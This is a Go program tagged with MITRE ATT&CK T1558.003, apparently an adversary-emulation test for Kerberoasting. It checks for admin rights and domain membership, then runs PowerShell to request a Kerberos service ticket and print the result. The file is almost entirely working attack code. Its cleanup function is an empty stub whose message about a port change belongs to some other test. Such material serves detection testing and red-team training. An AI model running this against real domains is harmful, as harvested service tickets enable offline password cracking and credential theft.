// T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting
package main

import (
	"fmt"
	"os/exec"
	"strings"
)

const outputDirectory = "C:\\Users\\Public"

func main() {
	if !isAdmin() {
		fmt.Println("[-] Not running as admin, exiting...")
		pressEnterToContinue()
		return
	}

	// Check if computer is part of a domain
	cmd := fmt.Sprintf("if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {return 1} else {return 0}")

	res, output := execute_command(cmd, true)
	if !res {
		fmt.Println("[-] Error: ", output)
		pressEnterToContinue()
		return
	} else if output == "1" {
		fmt.Println("[+] Computer is part of a domain")
	} else if output == "0" {
		fmt.Println("[-] Computer is not part of a domain")
		pressEnterToContinue()
		return
	} else {
		fmt.Println("[-] Unexecpted result", output)
		pressEnterToContinue()
		return
	}

	cmd = fmt.Sprintf("Add-Type -AssemblyName System.IdentityModel;" +
		"$ComputerFQDN=$env:LogonServer.trimStart('\\') + \".\" + $env:UserDnsDomain;" +
		"New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"HTTP/$ComputerFQDN\"")

	res, output = execute_command(cmd, true)
	if !res {
		fmt.Println("[-] Could not get ticket", output)
		pressEnterToContinue()
		return
	} else {
		fmt.Println("[+] Ticket retireved successfully: ", output)
		pressEnterToContinue()
		return
	}

}

func isAdmin() bool {
	cmd := exec.Command("net", "session")
	err := cmd.Run()
	if err != nil {
		return false
	} else {
		return true
	}
}

func execute_command(cmd string, isPowershell bool) (bool, string) {
	cmd_shell := "powershell"
	if !isPowershell {
		cmd_shell = "cmd"
	}
	// Run Command and Capture Output as well as Error
	out, err := exec.Command(cmd_shell, "/C", cmd).CombinedOutput()
	cmd_out := string(out)
	return err == nil, strings.TrimSpace(cmd_out)
}

func cleanup() {
	cmd := fmt.Sprintf("")
	res, output := execute_command(cmd, true)
	if res {
		fmt.Println("Port Changed Successfully")
	} else {
		fmt.Println("Error: ", output)
	}
}

func pressEnterToContinue() {
	fmt.Println("Press ENTER to continue...")
	fmt.Scanln()
}
